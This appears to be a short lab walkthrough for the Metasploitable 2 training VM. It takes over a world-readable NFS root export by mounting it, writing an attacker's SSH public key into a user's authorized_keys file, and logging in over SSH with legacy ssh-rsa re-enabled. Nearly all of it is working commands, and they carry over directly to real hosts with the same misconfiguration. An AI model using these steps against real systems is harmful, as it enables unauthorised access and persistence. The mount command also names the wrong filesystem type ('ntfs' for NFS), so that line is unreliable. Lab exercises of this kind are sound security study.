1. Verify RPC services using `rpcinfo -p <target_ip>`
- look for `mountd` and `nfs` in the list

2. Run `showmount -e <target_ip>` to show the list of shared directories:
```bash
/ *
```
- This means that the entire root system `/` is shared, and `*` shows the allowed client list, in this case any IP address can mount this share.

- The export list is the set of directories that is made accessible via NFS, and the IP addresses/subnets that are permitted access.


##### Create a mount point for the export
`sudo mkdir -p /tmp/metasploitable_nfs`

##### Mount the export
`sudo mount -t ntfs -o nfsvers=3,nolock <target_ip>:/ /tmp/metasploitable_nfs`

`cd /tmp/metasploitable_nfs/`

##### Create an SSH key on attacking machine and copy the <key>.pub to `/tmp/metasploitable_nfs/home/msfadmin/.ssh/authorized_keys` file


### Trying to SSH into metasploitable
```bash
ssh -i ~/.ssh/metasploitableV2 msfadmin@192.168.56.101
Unable to negotiate with 192.168.56.101 port 22: no matching hostkey type found. Their offer: ssh-rsa,ssh-dss
```

This happens cause modern ssh clients disable older, insecure algorithms like ssh-rsa by default:
Add the `-o` option to allow the host key type:
```bash
ssh -i ~/.ssh/metasploitableV2 \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    msfadmin@192.168.56.101
```
